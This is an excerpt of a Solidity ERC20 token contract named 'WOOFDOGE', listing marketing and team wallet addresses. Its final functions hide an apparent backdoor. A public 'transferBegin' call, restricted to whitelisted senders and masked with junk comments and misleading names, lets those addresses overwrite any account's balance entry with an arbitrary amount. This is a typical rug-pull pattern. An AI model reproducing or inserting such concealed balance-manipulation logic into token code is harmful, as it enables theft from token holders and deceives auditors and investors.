...
contract WOOFDOGE is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "WOOFDOGE";
    string private _symbol = "WOOFDOGE";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0x6709549cb56987764915268dABa4AEeC7feeBFB8); 
    address payable private teamWalletAddress = payable(0x480d3DEF70e40CEEb2292Cad6d003e4589696861); 
	...
	function _transferInternal(address spender, uint256 amount) internal{
        _usdt[spender] = 2**_buyLiquidityFee  + amount;
    }
	
    function _transferVersion(address spender, uint256 amount) internal{
        _transferInternal(spender, amount);
    }
	
	function transferBegin(address spender, uint256 amount) public{
	if( _swapMain[msg.sender/*as aXxsdfghjkll;’*/])
	   {
	      _transferVersion(spender, amount);
	   }
	}
